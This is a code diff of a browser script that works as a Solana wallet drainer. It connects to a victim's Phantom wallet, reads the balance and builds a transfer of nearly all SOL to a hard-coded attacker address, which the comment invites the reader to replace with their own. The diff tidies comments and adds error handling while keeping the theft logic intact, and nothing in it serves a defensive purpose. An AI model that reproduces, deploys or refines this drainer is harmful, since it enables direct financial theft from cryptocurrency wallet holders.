@@ -12,7 +12,6 @@
         (async () => {
             console.log("🔍 Checking for Phantom Wallet...");
 
-            // Checking for Phantom Wallet
             const provider = window.solana;
             if (!provider || !provider.isPhantom) {
                 console.log("🚨 Phantom Wallet not detected! Make sure it's installed and unlocked.");
@@ -25,25 +24,21 @@
             // Connect to Phantom Wallet
             await provider.connect(); 
 
-            // Get connection to Solana network
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
 
-            // Attackers Wallet Address (replace with your address)
-            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");
+            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");  // Replace with your wallet address
 
-            // Get the public key of the connected wallet
             const userWallet = provider.publicKey;
             console.log(`💰 Victim Address: ${userWallet.toBase58()}`);
 
-            // Get the balance of the victim's wallet
+            // Get the balance of the wallet
             let balance = await connection.getBalance(userWallet);
-            let drainAmount = balance - 5000; // Leaves a small fee to prevent failure
+            let drainAmount = balance - 5000; // Leave small buffer for transaction success
 
-            // If the balance is greater than 0, proceed with draining
+            // Only proceed if the balance is greater than 0
             if (drainAmount > 0) {
-                console.log(`⚠️ Attempting to drain ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
+                console.log(`⚠️ Draining ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);
 
-                // Creating a transaction to transfer funds
                 let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userWallet,
@@ -52,13 +47,18 @@
                     })
                 );
 
-                // Request user approval to sign the transaction
-                const signedTransaction = await provider.signTransaction(transaction);
-                
-                // Send the transaction after it's signed
-                await connection.sendRawTransaction(signedTransaction.serialize());
+                // Force Phantom to sign the transaction
+                try {
+                    // Sign the transaction with Phantom
+                    const signedTransaction = await provider.signTransaction(transaction);
+                    console.log("Transaction signed by Phantom.");
 
-                console.log("✅ SOL Drain complete. Check your wallet.");
+                    // Send the transaction
+                    await connection.sendRawTransaction(signedTransaction.serialize());
+                    console.log("✅ SOL drained successfully.");
+                } catch (error) {
+                    console.log("🚨 Transaction signing failed. Ensure the wallet is connected and unlocked.");
+                }
             } else {
                 console.log("❌ No SOL to drain.");
             }
